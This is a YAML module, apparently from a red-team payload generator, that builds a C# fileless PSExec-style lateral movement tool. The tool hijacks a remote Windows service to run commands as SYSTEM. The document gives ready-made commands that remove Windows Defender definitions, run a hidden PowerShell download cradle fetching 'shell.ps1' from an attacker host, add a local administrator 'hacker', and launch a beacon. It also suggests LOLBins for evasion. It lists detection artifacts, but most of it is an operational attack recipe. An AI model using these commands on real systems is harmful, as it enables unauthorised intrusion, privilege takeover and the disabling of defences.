meta:
  name: "Fileless PSExec Lateral Movement (C#)*"
  category: "Lateral Movement"
  description: |
    Remote code execution via Windows service manipulation without file upload.

    Features:
    - No file upload required (fileless execution)
    - Manipulates remote service configuration
    - Executes arbitrary binaries as SYSTEM
    - Disables Windows Defender signatures (optional first pass)
    - Restores service configuration after execution
    - Works over SMB/RPC

    This technique connects to a remote Windows machine's Service Control Manager,
    modifies an existing service's binary path, starts it to execute your command,
    then restores the original configuration. No files are dropped on disk.

    WARNING: For authorized security testing only!

  effectiveness: "high"

  mitre:
    tactic: "TA0008 - Lateral Movement"
    technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"

  artifacts:
    - "Remote SCM connection over RPC"
    - "Service configuration changes (temporary)"
    - "Service start/stop events"
    - "Windows Defender definition removal (if Pass 1 executes)"
    - "Event ID 7045 (Service created/modified)"
    - "Event ID 7040 (Service start type changed)"

parameters:
  - name: "target_host"
    type: "string"
    description: "Target Windows machine hostname or IP"
    required: true
    default: "192.168.1.10"

  - name: "service_name"
    type: "string"
    description: "Name of existing service to hijack"
    required: true
    default: "SensorService"

  - name: "binary_to_run"
    type: "string"
    description: "Command to execute as SYSTEM on target"
    required: true
    default: "C:\\Windows\\System32\\cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt"

  - name: "output_file"
    type: "string"
    description: "Output executable filename"
    required: false
    default: "psexec.exe"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing: []

output:
  type: "template"
  template: "lateral_movement/fileless_psexec.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 {{ source_file }}"
  launch_instructions: |
    # Enumerate Target Services

    ```powershell
    Get-Service -ComputerName {{ target_host }}
    sc \\{{ target_host }} query
    ```

    # Execute Fileless PSExec

    ```cmd
    {{ output_file }} {{ target_host }} {{ service_name }} "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
    ```

    # Example - Add Local Admin

    ```cmd
    {{ output_file }} {{ target_host }} {{ service_name }} "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
    ```

    # Example - Execute Binary

    ```cmd
    {{ output_file }} {{ target_host }} {{ service_name }} "C:\\Windows\\Temp\\beacon.exe"
    ```

    # Verify Execution

    ```cmd
    type \\{{ target_host }}\C$\Temp\out.txt
    ```

    ```powershell
    Get-Process -ComputerName {{ target_host }}
    ```

    # Notes
    - Target: {{ target_host }}, Service: {{ service_name }}, Command: {{ binary_to_run }}
    - Executes as NT AUTHORITY\SYSTEM on target (service context)
    - Requires admin credentials for remote SCM access (ports 135, 139, 445)
    - Fileless: No files dropped on target disk
    - Pass 1: Disables Windows Defender signatures (MpCmdRun.exe -RemoveDefinitions -All)
    - Pass 2: Executes your specified command via modified service binary path
    - Pass 3: Restores original service configuration automatically
    - Common hijack targets: SensorService, Spooler, SessionEnv (any non-critical service)
    - Consider LOLBins: regsvr32.exe, rundll32.exe, mshta.exe for evasion

    Troubleshooting:
    - Access Denied: Verify admin credentials and remote SCM access; check firewall allows 135,139,445/tcp
    - Service not found: Enumerate services first; try different service (avoid critical services)
    - Service start fails: Check if service already running or disabled; view Event ID 7036
    - No output: Command may have failed or no stdout (redirect to file: >C:\Temp\out.txt)
    - Defender still active: Pass 1 may have failed (check Defender status on target)
    - Event ID 7045, 7040, 4697 will fire (service installed/changed)
    - Sysmon Event ID 1 (process creation by service) will fire

    Cleanup:
    Service configuration is automatically restored.
    $ Remove-Item {{ output_file }} -Force
